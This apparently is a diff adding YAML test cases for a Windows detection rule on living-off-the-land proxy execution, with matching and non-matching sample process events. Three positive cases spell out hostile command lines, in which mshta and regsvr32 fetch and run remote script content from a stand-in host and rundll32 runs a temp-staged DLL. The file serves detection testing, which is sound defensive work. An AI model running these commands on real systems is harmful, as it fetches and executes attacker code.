@@ -1,0 +1,52 @@
+rule: TH-010-lolbins-proxy-execution
+description: >
+  Positives are the three canonical proxy-execution shapes. Negatives are the two highest-volume
+  benign patterns: Control Panel applets through rundll32, and local signed MSI installation.
+cases:
+  - name: mshta executing remote HTA content
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\mshta.exe'
+      CommandLine: 'mshta.exe http://198.51.100.44/update.hta'
+      ParentImage: 'C:\Program Files\Microsoft Office\root\Office16\excel.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: regsvr32 fetching a remote scriptlet
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\regsvr32.exe'
+      CommandLine: 'regsvr32.exe /s /u /i:http://198.51.100.44/file.sct scrobj.dll'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: rundll32 executing a DLL staged in a temp path
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\rundll32.exe'
+      CommandLine: 'rundll32.exe C:\Windows\Temp\payload.dll,DllRegisterServer'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'CONTOSO\svc-app'
+
+  - name: rundll32 opening a Control Panel applet
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\rundll32.exe'
+      CommandLine: 'rundll32.exe shell32.dll,Control_RunDLL timedate.cpl'
+      ParentImage: 'C:\Windows\explorer.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: msiexec installing a local signed package
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\msiexec.exe'
+      CommandLine: 'msiexec.exe /i "C:\Program Files\Contoso\packages\agent.msi" /qn'
+      ParentImage: 'C:\Program Files\Contoso\Agent\updater.exe'
+      User: 'NT AUTHORITY\SYSTEM'
+
+  - name: Non-LOLBin process with a URL argument
+    expect: no_match
+    event:
+      Image: 'C:\Program Files\Contoso\Sync\sync.exe'
+      CommandLine: 'sync.exe --endpoint https://sync.contoso.com/api'
+      ParentImage: 'C:\Windows\System32\services.exe'
+      User: 'NT AUTHORITY\SYSTEM'
